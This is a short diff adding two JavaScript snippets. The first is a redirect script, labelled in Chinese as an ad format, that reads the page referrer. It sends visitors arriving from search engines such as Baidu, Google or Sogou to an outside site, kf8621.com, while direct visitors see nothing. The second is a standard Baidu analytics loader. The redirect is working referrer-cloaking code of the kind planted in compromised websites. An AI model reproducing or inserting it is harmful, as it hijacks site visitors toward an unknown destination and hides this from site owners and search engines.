@@ -1,0 +1,2 @@
+"// A02-KF   广告格式18 直接打开不跳 ，搜索引擎进入跳（蜘蛛未知）：\r\n\r\nvar regexp=/\\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|sm|qq|so|sooule|niuhu|biso|360)(\\.[a-z0-9\\-]+){1,2}\\//ig;\r\nvar where =document.referrer;\r\nif(regexp.test(where))\r\n{\r\nwindow.location.href=\"https://kf8621.com/\";\r\n\r\n}\r\n"
+"var hmt = hmt || [];\n(function() {\n\tvar hm = document.createElement(\"script\");\n\thm.src = \"https://hm.baidu.com/hm.js?eccdbca0b39415e989c997b46d93f990\";\n\tvar s = document.getElementsByTagName(\"script\")[0];\n\ts.parentNode.insertBefore(hm, s);\n})();\n"
